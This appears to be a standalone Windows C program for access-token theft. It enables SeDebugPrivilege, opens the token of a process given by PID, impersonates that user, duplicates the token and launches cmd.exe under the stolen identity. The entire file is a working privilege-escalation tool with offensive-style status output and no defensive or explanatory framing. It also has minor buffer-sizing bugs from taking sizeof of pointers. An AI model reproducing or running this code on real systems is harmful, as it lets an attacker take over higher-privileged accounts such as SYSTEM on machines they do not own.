#include <windows.h>
#include <Lmcons.h>
#include <stdio.h>

BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup
        &luid))         // receives LUID of privilege
    {
        printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

    // Enable the privilege or disable all privileges.
    if (!AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
    {
        printf("[-] The token does not have the specified privilege.\n");
        return FALSE;
    }

    return TRUE;
}

char *getName(){
    char username[256]; 
    DWORD username_len = sizeof(username);  // Length of the buffer
    char *result;
    char *intro = "[+] Current user: ";
    memset(username, 0, 256);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len)) {
       result = malloc(sizeof(intro) + sizeof(username) + 3);
       strcpy(result, intro);
       strcat(result, username);
       strcat(result, "\r\n");
    } else {    
        char *fail = "Failed to get username.\r\n";
        result = malloc(sizeof(fail));
        strcpy(result, fail);
    }

    return result;
}

int main(int argc, char** argv)
{
    // Print whoami to compare to thread later
    printf("[+] Current user is: %s\n", getName());

    // Grab PID from command line argument
    char* pid_c = argv[1];
    DWORD PID_TO_IMPERSONATE = atoi(pid_c);

    // Initialize variables and structures
    HANDLE tokenHandle = NULL;
    HANDLE duplicateTokenHandle = NULL;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;

    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
    startupInfo.cb = sizeof(STARTUPINFO);

    // Add SE debug privilege
    HANDLE currentTokenHandle = NULL;
    BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
    if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
    {
        printf("[+] SeDebugPrivilege enabled!\n");
    }

    // Call OpenProcess(), print return code and error code
    HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, PID_TO_IMPERSONATE);
    if (processHandle != NULL)
    {
        printf("[+] OpenProcess() success!\n");
    }
    else
    {
        printf("[-] OpenProcess() Return Code: %i\n", processHandle);
        printf("[-] OpenProcess() Error: %i\n", GetLastError());
    }

    // Call OpenProcessToken(), print return code and error code
    BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
    if (getToken)
    {
        printf("[+] OpenProcessToken() success!\n");
    }
    else
    {
        printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
        printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
    }

    // Impersonate user in a thread
    BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
    if (impersonateUser)
    {
        printf("[+] ImpersonatedLoggedOnUser() success!\n");
        printf("[+] Current user is: %s\n", getName());
        printf("[+] Reverting thread to original user context\n");
        RevertToSelf();
    }
    else
    {
        printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", impersonateUser);
        printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
    }

    // Call DuplicateTokenEx(), print return code and error code
    BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
    if (duplicateToken)
    {
        printf("[+] DuplicateTokenEx() success!\n");
    }
    else
    {
        printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
        printf("[-] DuplicateTokenEx() Error: %i\n", GetLastError());
    }

    // Call CreateProcessWithTokenW(), print return code and error code
    BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
    if (createProcess)
    {
        printf("[+] Process spawned!\n");
    }
    else
    {
        printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
        printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
    }

    return 0;
}
